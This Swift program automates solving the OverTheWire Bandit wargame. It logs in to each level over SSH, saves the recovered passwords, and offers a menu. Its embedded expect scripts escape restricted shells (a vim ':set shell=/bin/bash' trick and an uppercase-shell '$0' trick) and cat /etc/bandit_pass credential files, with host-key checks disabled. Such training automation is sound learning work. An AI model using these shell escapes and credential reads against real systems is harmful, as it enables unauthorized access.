import Foundation
import TOMLKit

let DEFAULT_HOST = "bandit.labs.overthewire.org"
let DEFAULT_PORT = "2220"

let PASSWORD_RE = try! NSRegularExpression(pattern: "[A-Za-z0-9]{32}")
let PRIVATE_KEY_RE = try! NSRegularExpression(
    pattern: "-----BEGIN [A-Z ]*PRIVATE KEY-----.*?-----END [A-Z ]*PRIVATE KEY-----",
    options: [.dotMatchesLineSeparators]
)
let ANSI_RE = try! NSRegularExpression(
    pattern: "\u{001B}\\[[0-?]*[ -/]*[@-~]|\u{001B}P.*?\u{001B}\\\\|\u{001B}\\].*?(?:\u{0007}|\u{001B}\\\\)|\u{001B}.",
    options: [.dotMatchesLineSeparators]
)

let REQUIRED_FIELDS: [String: [String]] = [
    "ssh_command": ["from", "to", "command"],
    "path_then_command": ["from", "to", "find_command", "command"],
    "private_key_then_ssh": ["from", "to", "key_command", "key_name", "next_user", "next_command"],
    "bandit26_escape": ["from", "to", "key_command", "key_name"],
    "git_read_file": ["from", "to", "git_user", "repo", "file"],
    "git_show": ["from", "to", "git_user", "repo", "object"],
    "git_push_file": ["from", "to", "git_user", "repo", "file", "content", "commit_message"],
    "uppercase_shell": ["from", "to"]
]

public struct BanditError: Error, CustomStringConvertible {
    public let message: String
    public var description: String { message }
    public init(_ message: String) { self.message = message }
}

public struct Step {
    public let type: String
    public let fields: [String: TOMLValueConvertible]

    public func mustString(_ key: String) throws -> String {
        guard let v = fields[key]?.string else {
            throw BanditError("missing string field \(key)")
        }
        return v
    }

    public func fieldString(_ key: String, fallback: String) -> String {
        fields[key]?.string ?? fallback
    }

    public func mustInt(_ key: String) throws -> Int {
        guard let v = fields[key]?.int else {
            throw BanditError("missing int field \(key)")
        }
        return v
    }

    public func mustToList() throws -> [Int] {
        guard let v = fields["to"] else { throw BanditError("missing to field") }
        if let single = v.int { return [single] }
        if let arr = v.array {
            return try arr.map { item in
                guard let n = item.int else {
                    throw BanditError("to array contains non-int")
                }
                return n
            }
        }
        throw BanditError("to field has unsupported type")
    }

    public func mustToSingle() throws -> Int {
        let list = try mustToList()
        guard list.count == 1 else { throw BanditError("expected single target") }
        return list[0]
    }
}

public struct Config {
    public let host: String
    public let port: Int
    public let bootstrapLevel: Int
    public let bootstrapPassword: String
    public let steps: [Step]
}

public func envOr(_ name: String, fallback: String) -> String {
    if let v = ProcessInfo.processInfo.environment[name], !v.isEmpty {
        return v
    }
    return fallback
}

public func findRepoRoot() throws -> URL {
    var cwd = URL(fileURLWithPath: FileManager.default.currentDirectoryPath)
    while true {
        let probe = cwd.appendingPathComponent("levels").appendingPathComponent("bandit-levels.toml")
        if FileManager.default.fileExists(atPath: probe.path) {
            return cwd
        }
        let parent = cwd.deletingLastPathComponent()
        if parent.path == cwd.path {
            throw BanditError("could not find repo root containing levels/bandit-levels.toml")
        }
        cwd = parent
    }
}

public func stripTerminalCodes(_ text: String) -> String {
    let range = NSRange(text.startIndex..., in: text)
    let cleaned = ANSI_RE.stringByReplacingMatches(in: text, range: range, withTemplate: "")
    return cleaned.replacingOccurrences(of: "\r", with: "")
}

public func extractPasswords(_ text: String) -> [String] {
    let clean = stripTerminalCodes(text)
    let range = NSRange(clean.startIndex..., in: clean)
    return PASSWORD_RE.matches(in: clean, range: range).compactMap {
        Range($0.range, in: clean).map { String(clean[$0]) }
    }
}

public func extractPassword(_ text: String) throws -> String {
    let passwords = extractPasswords(text)
    guard let last = passwords.last else {
        throw BanditError("failed to extract a 32-character password from output:\n\(text)")
    }
    return last
}

public func renderTemplate(_ template: String, _ values: [String: String]) -> String {
    var out = template
    for (k, v) in values {
        out = out.replacingOccurrences(of: "{\(k)}", with: v)
    }
    return out
}

public func validateConfig(_ table: TOMLTable) throws {
    guard let boot = table["bootstrap"]?.table else {
        throw BanditError("config is missing [bootstrap]")
    }
    guard boot["level"] != nil else {
        throw BanditError("config bootstrap level is missing")
    }
    guard let pass = boot["password"]?.string, !pass.isEmpty else {
        throw BanditError("config bootstrap password is empty")
    }
    guard let steps = table["steps"]?.array, !steps.isEmpty else {
        throw BanditError("config has no steps")
    }
    for (idx, item) in steps.enumerated() {
        guard let step = item.table else {
            throw BanditError("step \(idx + 1) is not a table")
        }
        guard let type = step["type"]?.string else {
            throw BanditError("step \(idx + 1) is missing type")
        }
        guard let required = REQUIRED_FIELDS[type] else {
            throw BanditError("step \(idx + 1) has unsupported type \"\(type)\"")
        }
        for field in required where step[field] == nil {
            throw BanditError("step \(idx + 1) (\(type)) is missing \(field)")
        }
    }
}

public struct ProcResult {
    public let exitCode: Int32
    public let output: String
}

public func runCommand(
    _ name: String,
    args: [String] = [],
    env: [String: String] = [:],
    input: String? = nil,
    cwd: URL? = nil
) throws -> ProcResult {
    let process = Process()
    process.executableURL = URL(fileURLWithPath: which(name) ?? name)
    process.arguments = args
    if let cwd = cwd { process.currentDirectoryURL = cwd }
    var environment = ProcessInfo.processInfo.environment
    for (k, v) in env { environment[k] = v }
    process.environment = environment

    let outPipe = Pipe()
    process.standardOutput = outPipe
    process.standardError = outPipe

    let inPipe: Pipe? = input != nil ? Pipe() : nil
    if let inPipe = inPipe {
        process.standardInput = inPipe
    }

    try process.run()
    if let input = input, let inPipe = inPipe {
        if let data = input.data(using: .utf8) {
            inPipe.fileHandleForWriting.write(data)
        }
        try inPipe.fileHandleForWriting.close()
    }
    let data = outPipe.fileHandleForReading.readDataToEndOfFile()
    process.waitUntilExit()
    return ProcResult(
        exitCode: process.terminationStatus,
        output: String(data: data, encoding: .utf8) ?? ""
    )
}

public func which(_ cmd: String) -> String? {
    guard let path = ProcessInfo.processInfo.environment["PATH"] else { return nil }
    for dir in path.split(separator: ":") {
        let candidate = "\(dir)/\(cmd)"
        if FileManager.default.isExecutableFile(atPath: candidate) {
            return candidate
        }
    }
    return nil
}

public func checkDependencies() throws {
    for cmd in ["expect", "ssh", "git", "awk", "grep", "mktemp"] {
        if which(cmd) == nil {
            throw BanditError("missing required command: \(cmd)")
        }
    }
}

public func runExpect(_ script: String, env: [String: String]) throws -> String {
    let r = try runCommand("expect", env: env, input: script)
    if r.exitCode != 0 { throw BanditError(r.output) }
    return r.output
}

let SCRIPT_PASSWORD_SSH = #"""
set timeout 180
spawn -noecho ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -o PubkeyAuthentication=no \
  -o PreferredAuthentications=password \
  -o NumberOfPasswordPrompts=1 \
  -p $env(BANDIT_PORT_VALUE) \
  $env(BANDIT_USER_VALUE)@$env(BANDIT_HOST_VALUE) \
  $env(BANDIT_COMMAND_VALUE)
expect {
  "*password:" {
    send -- "$env(BANDIT_PASSWORD_VALUE)\r"
    exp_continue
  }
  timeout {
    exit 124
  }
  eof {
  }
}
catch wait result
exit [lindex $result 3]
"""#

let SCRIPT_BANDIT26 = #"""
set timeout 90
set stty_init "rows 5 columns 80"
spawn -noecho ssh \
  -tt \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -o IdentitiesOnly=yes \
  -i $env(BANDIT_KEY_VALUE) \
  -p $env(BANDIT_PORT_VALUE) \
  bandit26@$env(BANDIT_HOST_VALUE)
expect {
  -re "--More--" {
    send -- "v"
  }
  timeout {
    exit 124
  }
  eof {
    exit 1
  }
}
expect {
  -re "~" {
  }
  timeout {
    exit 124
  }
  eof {
    exit 1
  }
}
after 500
send -- "\033:set shell=/bin/bash\r"
after 500
send -- ":shell\r"
after 500
send -- "cat /etc/bandit_pass/bandit26; ./bandit27-do cat /etc/bandit_pass/bandit27; exit\r"
set password_count 0
expect {
  -re {[[:alnum:]]{32}} {
    incr password_count
    if {$password_count < 2} {
      exp_continue
    }
  }
  timeout {
    exit 124
  }
  eof {
    exit 1
  }
}
close
wait
exit 0
"""#

let SCRIPT_UPPERCASE = #"""
set timeout 60
spawn -noecho ssh \
  -tt \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -o PubkeyAuthentication=no \
  -o PreferredAuthentications=password \
  -o NumberOfPasswordPrompts=1 \
  -p $env(BANDIT_PORT_VALUE) \
  bandit32@$env(BANDIT_HOST_VALUE)
expect {
  "*password:" {
    send -- "$env(BANDIT_PASSWORD_VALUE)\r"
    exp_continue
  }
  -re "WELCOME TO THE UPPERCASE SHELL|>>" {
  }
  timeout {
    exit 124
  }
}
after 500
send -- "\$0\r"
expect {
  -re {[$#] } {
  }
  timeout {
    exit 124
  }
}
send -- "cat /etc/bandit_pass/bandit33; exit\r"
expect {
  -re {[[:alnum:]]{32}} {
  }
  timeout {
    exit 124
  }
}
close
wait
exit 0
"""#

let SCRIPT_INTERACTIVE = #"""
set timeout 30
spawn ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -o PubkeyAuthentication=no \
  -o PreferredAuthentications=password \
  -p $env(BANDIT_PORT_VALUE) \
  $env(BANDIT_USER_VALUE)@$env(BANDIT_HOST_VALUE)
expect {
  "*password:" {
    send -- "$env(BANDIT_PASSWORD_VALUE)\r"
    interact
  }
  timeout {
    interact
  }
  eof {
  }
}
"""#

public final class App {
    public var host: String = ""
    public var port: String = ""
    public var repoRoot: URL
    public var configPath: URL
    public var passFile: URL
    public var keyDir: URL

    public init() throws {
        repoRoot = try findRepoRoot()
        let defaultConfig = repoRoot.appendingPathComponent("levels").appendingPathComponent("bandit-levels.toml")
        configPath = URL(fileURLWithPath: envOr("BANDIT_LEVELS_FILE", fallback: defaultConfig.path))
        passFile = repoRoot.appendingPathComponent("bandit-passwords.txt")
        keyDir = repoRoot.appendingPathComponent(".bandit-keys")
    }

    public func run(_ args: [String]) throws {
        var refresh = false
        var show = false
        var sshLvl: Int = -1

        var i = 0
        while i < args.count {
            switch args[i] {
            case "--config":
                i += 1
                if i >= args.count { throw BanditError("--config requires a path") }
                configPath = URL(fileURLWithPath: args[i])
            case "--refresh":
                refresh = true
            case "--show":
                show = true
            case "--ssh":
                i += 1
                if i >= args.count { throw BanditError("--ssh requires a level") }
                guard let n = Int(args[i]) else { throw BanditError("invalid level") }
                sshLvl = n
            default:
                throw BanditError("unknown flag: \(args[i])")
            }
            i += 1
        }

        let cfg = try loadConfig()
        applyConnection(cfg)

        if refresh { try refreshAll(cfg) }
        else if show { try showPasswords() }
        else if sshLvl >= 0 { try sshLevel(sshLvl) }
        else { try menu(cfg) }
    }

    public func loadConfig() throws -> Config {
        let text = try String(contentsOf: configPath, encoding: .utf8)
        let table: TOMLTable
        do {
            table = try TOMLTable(string: text)
        } catch {
            throw BanditError("parse config: \(error)")
        }
        try validateConfig(table)

        var hostCfg = ""
        var portCfg = 0
        if let conn = table["connection"]?.table {
            if let h = conn["host"]?.string { hostCfg = h }
            if let p = conn["port"]?.int { portCfg = p }
        }
        let boot = table["bootstrap"]!.table!
        let bootLevel = boot["level"]!.int!
        let bootPass = boot["password"]!.string!

        var steps: [Step] = []
        for item in table["steps"]!.array! {
            let stepTable = item.table!
            var dict: [String: TOMLValueConvertible] = [:]
            for key in stepTable.keys {
                if let value = stepTable[key] {
                    dict[key] = value
                }
            }
            let type = stepTable["type"]!.string!
            steps.append(Step(type: type, fields: dict))
        }
        return Config(host: hostCfg, port: portCfg, bootstrapLevel: bootLevel, bootstrapPassword: bootPass, steps: steps)
    }

    public func applyConnection(_ cfg: Config) {
        host = envOr("BANDIT_HOST", fallback: cfg.host)
        if host.isEmpty { host = DEFAULT_HOST }
        let envPort = ProcessInfo.processInfo.environment["BANDIT_PORT"] ?? ""
        if !envPort.isEmpty {
            port = envPort
        } else if cfg.port != 0 {
            port = String(cfg.port)
        } else {
            port = DEFAULT_PORT
        }
    }

    public func ensureState() throws {
        try FileManager.default.createDirectory(at: keyDir, withIntermediateDirectories: true,
                                                 attributes: [.posixPermissions: 0o700])
        if !FileManager.default.fileExists(atPath: passFile.path) {
            FileManager.default.createFile(atPath: passFile.path, contents: nil,
                                            attributes: [.posixPermissions: 0o600])
        }
        try FileManager.default.setAttributes([.posixPermissions: 0o700], ofItemAtPath: keyDir.path)
        try FileManager.default.setAttributes([.posixPermissions: 0o600], ofItemAtPath: passFile.path)
    }

    public func savePassword(_ user: String, _ password: String) throws {
        try ensureState()
        var lines: [String] = []
        if let content = try? String(contentsOf: passFile, encoding: .utf8) {
            for line in content.split(separator: "\n", omittingEmptySubsequences: false) {
                let s = String(line)
                if s.isEmpty || s.hasPrefix("\(user):") { continue }
                lines.append(s)
            }
        }
        lines.append("\(user): \(password)")
        let body = lines.joined(separator: "\n") + "\n"
        try body.write(to: passFile, atomically: true, encoding: .utf8)
        try FileManager.default.setAttributes([.posixPermissions: 0o600], ofItemAtPath: passFile.path)
    }

    public func getSavedPassword(_ user: String) -> String {
        guard let content = try? String(contentsOf: passFile, encoding: .utf8) else { return "" }
        let prefix = "\(user): "
        var password = ""
        for line in content.split(separator: "\n", omittingEmptySubsequences: false) {
            let s = String(line)
            if s.hasPrefix(prefix) {
                password = String(s.dropFirst(prefix.count))
            }
        }
        return password
    }

    public func recordPassword(_ level: Int, _ password: String) throws {
        let user = "bandit\(level)"
        if level != 0 {
            let nsr = NSRange(password.startIndex..., in: password)
            let m = PASSWORD_RE.firstMatch(in: password, range: nsr)
            if m == nil || m!.range.length != password.count || password.count != 32 {
                throw BanditError("refusing to save invalid password for \(user): \(password)")
            }
        }
        try savePassword(user, password)
        let padded = user.padding(toLength: 8, withPad: " ", startingAt: 0)
        print("[+] \(padded) \(password)")
    }

    public func runPasswordSshCommand(user: String, password: String, command: String) throws -> String {
        let env: [String: String] = [
            "BANDIT_HOST_VALUE": host,
            "BANDIT_PORT_VALUE": port,
            "BANDIT_USER_VALUE": user,
            "BANDIT_PASSWORD_VALUE": password,
            "BANDIT_COMMAND_VALUE": command
        ]
        do {
            return try runExpect(SCRIPT_PASSWORD_SSH, env: env)
        } catch let e as BanditError {
            throw BanditError("SSH command failed for \(user): \(command)\n\(e.message)")
        }
    }

    public func runKeySshCommand(user: String, keyFile: URL, command: String) throws -> String {
        let args = [
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", "LogLevel=ERROR",
            "-o", "IdentitiesOnly=yes",
            "-o", "BatchMode=yes",
            "-i", keyFile.path,
            "-p", port,
            "\(user)@\(host)",
            command
        ]
        let r = try runCommand("ssh", args: args)
        if r.exitCode != 0 { throw BanditError(r.output) }
        return r.output
    }

    public func solvePassword(user: String, password: String, command: String) throws -> String {
        try extractPassword(try runPasswordSshCommand(user: user, password: password, command: command))
    }

    public func solvePath(user: String, password: String, command: String) throws -> String {
        let output = stripTerminalCodes(try runPasswordSshCommand(user: user, password: password, command: command))
        let lines = output.split(separator: "\n", omittingEmptySubsequences: false).map(String.init)
        for line in lines.reversed() {
            if line.contains("/inhere/") { return line }
        }
        throw BanditError("failed to extract path from output:\n\(output)")
    }

    public func savePrivateKey(name: String, output: String) throws -> URL {
        let clean = stripTerminalCodes(output)
        let nsr = NSRange(clean.startIndex..., in: clean)
        guard let m = PRIVATE_KEY_RE.firstMatch(in: clean, range: nsr),
              let r = Range(m.range, in: clean) else {
            throw BanditError("failed to extract private key \(name) from output:\n\(output)")
        }
        try ensureState()
        let keyFile = keyDir.appendingPathComponent(name)
        try (String(clean[r]) + "\n").write(to: keyFile, atomically: true, encoding: .utf8)
        try FileManager.default.setAttributes([.posixPermissions: 0o600], ofItemAtPath: keyFile.path)
        return keyFile
    }

    public func solveBandit26Pair(keyFile: URL) throws -> (String, String) {
        let env: [String: String] = [
            "BANDIT_HOST_VALUE": host,
            "BANDIT_PORT_VALUE": port,
            "BANDIT_KEY_VALUE": keyFile.path
        ]
        let output = try runExpect(SCRIPT_BANDIT26, env: env)
        let passwords = extractPasswords(output)
        if passwords.count < 2 {
            throw BanditError("expected two passwords from bandit26 output:\n\(output)")
        }
        return (passwords[passwords.count - 2], passwords[passwords.count - 1])
    }

    public func solveUppercaseShell(_ password: String) throws -> String {
        let env: [String: String] = [
            "BANDIT_HOST_VALUE": host,
            "BANDIT_PORT_VALUE": port,
            "BANDIT_PASSWORD_VALUE": password
        ]
        return try extractPassword(try runExpect(SCRIPT_UPPERCASE, env: env))
    }

    public func gitEnv(_ password: String, askpass: URL) -> [String: String] {
        let sshCmd = "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR " +
                     "-o PubkeyAuthentication=no -o PreferredAuthentications=password -o NumberOfPasswordPrompts=1"
        return [
            "BANDIT_GIT_PASSWORD": password,
            "GIT_SSH_COMMAND": sshCmd,
            "SSH_ASKPASS": askpass.path,
            "SSH_ASKPASS_REQUIRE": "force",
            "DISPLAY": envOr("DISPLAY", fallback: ":0")
        ]
    }

    public func writeAskpass(_ dir: URL) throws -> URL {
        let askpass = dir.appendingPathComponent("askpass.sh")
        try "#!/usr/bin/env bash\nprintf '%s\\n' \"$BANDIT_GIT_PASSWORD\"\n".write(
            to: askpass, atomically: true, encoding: .utf8
        )
        try FileManager.default.setAttributes([.posixPermissions: 0o700], ofItemAtPath: askpass.path)
        return askpass
    }

    public func gitCloneRepo(user: String, password: String, remotePath: String, destination: URL) throws {
        let tmp = try makeTempDir("bandit-git-askpass.")
        defer { try? FileManager.default.removeItem(at: tmp) }
        let askpass = try writeAskpass(tmp)
        let remote = "ssh://\(user)@\(host):\(port)\(remotePath)"
        let r = try runCommand("git", args: ["clone", remote, destination.path], env: gitEnv(password, askpass: askpass))
        if r.exitCode != 0 { throw BanditError(r.output) }
    }

    public func gitPushWithPassword(_ password: String, repo: URL) throws -> String {
        let tmp = try makeTempDir("bandit-git-askpass.")
        defer { try? FileManager.default.removeItem(at: tmp) }
        let askpass = try writeAskpass(tmp)
        let r = try runCommand("git", args: ["-C", repo.path, "push", "origin", "master"], env: gitEnv(password, askpass: askpass))
        return r.output
    }

    public func stepContext(level: Int, password: String, toLevel: Int) -> [String: String] {
        let randomPort = 20000 + Int.random(in: 0..<10000)
        let tempOutput = "/tmp/bandit\(toLevel)pass.\(getpid()).\(1000 + Int.random(in: 0..<9000))"
        return [
            "password": password,
            "level": String(level),
            "to": String(toLevel),
            "random_port": String(randomPort),
            "temp_output": tempOutput
        ]
    }

    public func refreshAll(_ cfg: Config) throws {
        try checkDependencies()
        try ensureState()
        print("Refreshing Bandit passwords via \(host):\(port)")
        print("Level config:  \(configPath.path)")
        print("Password file: \(passFile.path)")
        print("Key cache:     \(keyDir.path)")
        print()
        var passwords: [Int: String] = [cfg.bootstrapLevel: cfg.bootstrapPassword]
        try recordPassword(cfg.bootstrapLevel, cfg.bootstrapPassword)
        for step in cfg.steps {
            try solveStep(step, passwords: &passwords)
        }
        print()
        print("Refresh complete.")
    }

    public func solveStep(_ step: Step, passwords: inout [Int: String]) throws {
        let fromLevel = try step.mustInt("from")
        let fromUser = step.fieldString("user", fallback: "bandit\(fromLevel)")
        guard let fromPassword = passwords[fromLevel] else {
            throw BanditError("missing password for bandit\(fromLevel)")
        }

        switch step.type {
        case "ssh_command":
            let toLevel = try step.mustToSingle()
            let ctx = stepContext(level: fromLevel, password: fromPassword, toLevel: toLevel)
            let cmd = renderTemplate(try step.mustString("command"), ctx)
            let pw = try solvePassword(user: fromUser, password: fromPassword, command: cmd)
            passwords[toLevel] = pw
            try recordPassword(toLevel, pw)
        case "path_then_command":
            let toLevel = try step.mustToSingle()
            var ctx = stepContext(level: fromLevel, password: fromPassword, toLevel: toLevel)
            let findCmd = renderTemplate(try step.mustString("find_command"), ctx)
            let path = try solvePath(user: fromUser, password: fromPassword, command: findCmd)
            ctx["path"] = path
            let cmd = renderTemplate(try step.mustString("command"), ctx)
            let pw = try solvePassword(user: fromUser, password: fromPassword, command: cmd)
            passwords[toLevel] = pw
            try recordPassword(toLevel, pw)
        case "private_key_then_ssh":
            let toLevel = try step.mustToSingle()
            let ctx = stepContext(level: fromLevel, password: fromPassword, toLevel: toLevel)
            let keyCmd = renderTemplate(try step.mustString("key_command"), ctx)
            let output = try runPasswordSshCommand(user: fromUser, password: fromPassword, command: keyCmd)
            let keyFile = try savePrivateKey(name: try step.mustString("key_name"), output: output)
            let nextCmd = renderTemplate(try step.mustString("next_command"), ctx)
            let keyOut = try runKeySshCommand(user: try step.mustString("next_user"), keyFile: keyFile, command: nextCmd)
            let pw = try extractPassword(keyOut)
            passwords[toLevel] = pw
            try recordPassword(toLevel, pw)
        case "bandit26_escape":
            let targets = try step.mustToList()
            let ctx = stepContext(level: fromLevel, password: fromPassword, toLevel: targets.last!)
            let keyCmd = renderTemplate(try step.mustString("key_command"), ctx)
            let output = try runPasswordSshCommand(user: fromUser, password: fromPassword, command: keyCmd)
            let keyFile = try savePrivateKey(name: try step.mustString("key_name"), output: output)
            let (pw1, pw2) = try solveBandit26Pair(keyFile: keyFile)
            let solved = [pw1, pw2]
            if targets.count != solved.count {
                throw BanditError("bandit26_escape expected \(targets.count) targets, got \(solved.count) passwords")
            }
            for (i, target) in targets.enumerated() {
                passwords[target] = solved[i]
                try recordPassword(target, solved[i])
            }
        case "git_read_file":
            let toLevel = try step.mustToSingle()
            let tmp = try makeTempDir("bandit-repo.")
            defer { try? FileManager.default.removeItem(at: tmp) }
            let repo = tmp.appendingPathComponent("repo")
            try gitCloneRepo(user: try step.mustString("git_user"), password: fromPassword,
                             remotePath: try step.mustString("repo"), destination: repo)
            let content = try String(contentsOf: repo.appendingPathComponent(try step.mustString("file")), encoding: .utf8)
            let pw = try extractPassword(content)
            passwords[toLevel] = pw
            try recordPassword(toLevel, pw)
        case "git_show":
            let toLevel = try step.mustToSingle()
            let tmp = try makeTempDir("bandit-repo.")
            defer { try? FileManager.default.removeItem(at: tmp) }
            let repo = tmp.appendingPathComponent("repo")
            try gitCloneRepo(user: try step.mustString("git_user"), password: fromPassword,
                             remotePath: try step.mustString("repo"), destination: repo)
            let r = try runCommand("git", args: ["-C", repo.path, "show", try step.mustString("object")])
            if r.exitCode != 0 { throw BanditError(r.output) }
            let pw = try extractPassword(r.output)
            passwords[toLevel] = pw
            try recordPassword(toLevel, pw)
        case "git_push_file":
            let toLevel = try step.mustToSingle()
            let tmp = try makeTempDir("bandit-repo.")
            defer { try? FileManager.default.removeItem(at: tmp) }
            let repo = tmp.appendingPathComponent("repo")
            try gitCloneRepo(user: try step.mustString("git_user"), password: fromPassword,
                             remotePath: try step.mustString("repo"), destination: repo)
            func gitRun(_ args: [String]) throws {
                let r = try runCommand("git", args: ["-C", repo.path] + args)
                if r.exitCode != 0 { throw BanditError(r.output) }
            }
            try gitRun(["config", "user.email", "bandit-solver@example.invalid"])
            try gitRun(["config", "user.name", "bandit-solver"])
            try step.mustString("content").write(
                to: repo.appendingPathComponent(try step.mustString("file")),
                atomically: true, encoding: .utf8
            )
            try gitRun(["add", "-f", try step.mustString("file")])
            try gitRun(["commit", "-m", try step.mustString("commit_message")])
            let pushOut = try gitPushWithPassword(fromPassword, repo: repo)
            let pw = try extractPassword(pushOut)
            passwords[toLevel] = pw
            try recordPassword(toLevel, pw)
        case "uppercase_shell":
            let toLevel = try step.mustToSingle()
            let pw = try solveUppercaseShell(fromPassword)
            passwords[toLevel] = pw
            try recordPassword(toLevel, pw)
        default:
            throw BanditError("unsupported step type: \(step.type)")
        }
    }

    public func showPasswords() throws {
        try ensureState()
        let data = try Data(contentsOf: passFile)
        if data.isEmpty {
            print("No passwords saved yet.")
        } else if let str = String(data: data, encoding: .utf8) {
            print(str, terminator: "")
        }
    }

    public func sshLevel(_ level: Int) throws {
        try ensureState()
        let user = "bandit\(level)"
        let password = getSavedPassword(user)
        if password.isEmpty {
            let task = Process()
            task.executableURL = URL(fileURLWithPath: which("ssh") ?? "/usr/bin/ssh")
            task.arguments = ["\(user)@\(host)", "-p", port]
            try task.run()
            task.waitUntilExit()
            return
        }
        let tmpDir = URL(fileURLWithPath: NSTemporaryDirectory())
        let scriptFile = tmpDir.appendingPathComponent("bandit-ssh.\(getpid()).exp")
        try SCRIPT_INTERACTIVE.write(to: scriptFile, atomically: true, encoding: .utf8)
        defer { try? FileManager.default.removeItem(at: scriptFile) }
        let task = Process()
        task.executableURL = URL(fileURLWithPath: which("expect") ?? "/usr/bin/expect")
        task.arguments = ["-f", scriptFile.path]
        var env = ProcessInfo.processInfo.environment
        env["BANDIT_HOST_VALUE"] = host
        env["BANDIT_PORT_VALUE"] = port
        env["BANDIT_USER_VALUE"] = user
        env["BANDIT_PASSWORD_VALUE"] = password
        task.environment = env
        try task.run()
        task.waitUntilExit()
    }

    public func savePasswordInteractive() throws {
        print("Save password for which user? Example: bandit6: ", terminator: "")
        guard let user = readLine()?.trimmingCharacters(in: .whitespaces), !user.isEmpty else { return }
        print("Password: ", terminator: "")
        guard let password = readLine()?.trimmingCharacters(in: .whitespaces) else { return }
        try savePassword(user, password)
        print("Saved password for \(user).")
    }

    public func menu(_ cfg: Config) throws {
        try ensureState()
        while true {
            print("====================================")
            print("        OverTheWire Bandit App")
            print("====================================")
            print()
            print("Password file: \(passFile.path)")
            print("Key cache:     \(keyDir.path)")
            print()
            print("1) SSH into a Bandit level")
            print("2) Refresh all passwords")
            print("3) Save/update a password")
            print("4) Show saved passwords")
            print("5) Exit")
            print()
            print("Choose an option: ", terminator: "")
            let choice = readLine()?.trimmingCharacters(in: .whitespaces) ?? ""
            switch choice {
            case "1":
                print("Bandit level number, e.g. 0, 1, 26, 33: ", terminator: "")
                if let lvl = Int(readLine()?.trimmingCharacters(in: .whitespaces) ?? "") {
                    try sshLevel(lvl)
                }
            case "2":
                try refreshAll(cfg)
                print("Press Enter to continue...", terminator: "")
                _ = readLine()
            case "3":
                try savePasswordInteractive()
            case "4":
                try showPasswords()
                print("Press Enter to continue...", terminator: "")
                _ = readLine()
            case "5":
                return
            default:
                print("Invalid option.")
            }
        }
    }
}

public func makeTempDir(_ prefix: String) throws -> URL {
    let base = URL(fileURLWithPath: NSTemporaryDirectory())
    for _ in 0..<16 {
        let suffix = String((0..<8).map { _ in
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".randomElement()!
        })
        let path = base.appendingPathComponent("\(prefix)\(suffix)")
        do {
            try FileManager.default.createDirectory(at: path, withIntermediateDirectories: false,
                                                     attributes: [.posixPermissions: 0o700])
            return path
        } catch CocoaError.fileWriteFileExists {
            continue
        }
    }
    throw BanditError("makeTempDir: failed after 16 attempts")
}
